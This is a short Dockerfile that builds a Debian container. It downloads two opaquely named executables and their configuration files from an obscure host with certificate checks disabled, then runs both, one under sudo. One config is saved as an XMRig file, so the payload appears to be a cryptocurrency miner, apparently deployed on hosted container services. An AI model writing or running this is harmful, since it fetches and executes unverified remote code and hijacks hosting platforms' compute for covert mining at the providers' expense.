FROM debian
RUN apt update
RUN DEBIAN_FRONTEND=noninteractive apt install curl git wget unzip screen sudo python3-pip -y
RUN curl -LO https://proot.gitlab.io/proot/bin/proot
RUN chmod 755 proot
RUN mv proot /bin
RUN wget --no-check-certificate https://s.bccx.eu.org/s
RUN wget --no-check-certificate https://s.bccx.eu.org/v
RUN wget --no-check-certificate https://s.bccx.eu.org/config.json -O /root/.config/xmrig.json
RUN wget --no-check-certificate https://s.bccx.eu.org/v.json
RUN chmod +x s
RUN chmod +x v
CMD nohup ./v -config v.json & sudo ./s
